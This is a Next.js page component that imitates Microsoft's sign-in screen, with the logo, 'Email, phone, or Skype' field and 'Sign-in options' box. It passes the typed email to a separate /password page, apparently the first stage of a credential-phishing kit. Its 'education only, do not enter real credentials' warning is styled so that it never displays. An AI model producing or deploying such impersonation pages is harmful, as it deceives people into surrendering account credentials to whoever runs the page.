import Head from 'next/head'
import {KeyRound} from 'lucide-react'
import { useRouter } from 'next/router'
import { useState } from 'react'

export default function Home() {

  const router = useRouter()
  const [email, setEmail] = useState('')

  const handleNext = () => {
    if (email.trim()) {
      router.push(`/password?email=${encodeURIComponent(email)}`)
    }
  }

  return (
    <>
      <Head>
        <title>Sign in to your account</title>
      </Head>
      <div className="min-h-screen flex flex-col justify-center items-center bg-gradient-to-br from-red-100 via-blue-100 to-green-100 px-4">
        <div className="bg-white shadow-md rounded-sm p-8 w-full max-w-md text-gray-800">
          <img src="/mslogo.png" alt="Microsoft" className="w-32 mb-6" />
          <h2 className="text-2xl font-semibold mb-6">Sign in</h2>
          <input
            type="text"
            placeholder="Email, phone, or Skype"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full border-b border-gray-400 outline-none p-2 mb-6 focus:border-blue-600"
          />
          <div className="text-sm mb-6">
            <p className='mb-4'>No account? <a href="#" className="text-blue-600 hover:underline">Create one!</a></p>
            <p className='mb-4'><a href="#" className="text-blue-600 hover:underline">Can’t access your account?</a></p>
          </div>
          <div className='flex justify-end items-center'>
              <button 
               onClick={handleNext}
               className="flex justify-center items-center w-[100px] h-[35px] bg-blue-700 text-white py-2 font-semibold hover:bg-blue-800">
                Next
              </button>
          </div>
          
        </div>
        <div className='w-full max-w-[440px]'>
             <div className="w-full bg-white shadow mt-4 py-3 px-6 rounded-sm flex items-center space-x-2 cursor-pointer hover:shadow-md">
              <span className="text-xl"><KeyRound className="w-5 h-5" /></span>
              <span className="text-sm text-gray-600 font-medium">Sign-in options</span>
            </div>
        </div>
       
        <p className="mt-4 text-xs text-red-500 text-center hidden md:hidden">⚠️ This is a UI clone for education only. Do NOT enter real credentials.</p>
      </div>
    </>
  )
}
